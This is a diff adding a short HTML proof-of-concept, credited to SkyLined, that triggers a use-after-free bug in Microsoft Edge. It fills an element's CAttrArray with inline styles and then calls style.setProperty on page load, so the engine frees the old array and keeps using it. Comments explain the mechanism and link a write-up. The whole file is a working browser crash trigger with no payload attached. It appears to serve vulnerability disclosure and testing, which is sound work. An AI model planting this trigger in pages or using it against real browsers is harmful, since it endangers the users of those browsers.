@@ -1,0 +1,12 @@
+<x id=x style="background-image: inherit;text-decoration: line-through;height: 0;width: 0;top: 0;left: 0;right: 0;bottom: 0;"><script>
+  window.onload = function () {
+    // This PoC attempts to exploit a use-after-free bug in Microsoft Edge
+    // See http://blog.skylined.nl/20161115001.html for details.
+    // The CAttrArray is full, adding another style property will cause Edge to
+    // allocate a larger CAttrArray, copy everything and free the old one.
+    // The old one then continues to be used almost immediately:
+    x.style.setProperty("font", "menu");
+    // This work by SkyLined is licensed under a Creative Commons
+    // Attribution-Non-Commercial 4.0 International License. 
+  };
+</script>
